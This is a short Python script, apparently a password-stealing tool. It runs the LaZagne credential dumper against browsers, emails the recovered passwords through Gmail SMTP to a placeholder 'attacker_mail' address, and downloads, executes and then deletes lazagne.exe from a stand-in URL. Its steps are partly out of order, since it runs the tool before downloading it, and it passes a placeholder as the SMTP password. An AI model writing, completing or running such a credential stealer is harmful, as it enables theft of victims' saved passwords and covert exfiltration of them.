#!/usr/bin/env python

import requests
import subprocess
import smtplib
import os
import tempfile

def download(url):
    # Download the file from the specified URL
    get_response = requests.get(url)
    filename = url.split("/")[-1]
    
    # Save the downloaded file in the user's temp directory using tempfile module
    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, filename)

    with open(file_path, 'wb') as out_file:
        out_file.write(get_response.content)

    return file_path

def send_mail(email, password, message):
    # Establish a connection with the SMTP server and send the email
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

# Execute the command to retrieve saved passwords
command = "lazagne.exe browsers"
result = subprocess.check_output(command, shell=True)

# Send the retrieved passwords via email
send_mail("attacker_mail", "target_mail", result)

# Specify the download link for lazagne.exe
download_link = "https://example.com/lazagne.exe"  # Replace with the actual download link

# Download the lazagne.exe file and obtain the path to the downloaded file
downloaded_file = download(download_link)

# Add a timeout function to handle execution time
timeout_seconds = 30
try:
    # Execute the downloaded file and wait for it to complete or timeout
    subprocess.run(downloaded_file, timeout=timeout_seconds)
except subprocess.TimeoutExpired:
    print("Execution timed out")

# Remove the downloaded file after execution
os.remove(downloaded_file)
